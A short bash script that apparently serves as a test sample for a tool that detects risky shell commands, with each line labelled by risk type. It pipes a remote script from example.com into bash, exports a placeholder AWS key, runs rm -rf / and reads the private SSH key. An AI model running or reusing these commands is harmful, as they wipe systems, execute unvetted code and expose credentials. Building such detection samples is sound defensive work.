#!/usr/bin/env bash
set -e

# Download and execute
curl -fsSL https://example.com/setup.sh | bash

# Secret key
export AWS_ACCESS_KEY_ID="AKIAIOSFODNN7EXAMPLE"

# Dangerous command
rm -rf /

# Sensitive path
cat ~/.ssh/id_rsa
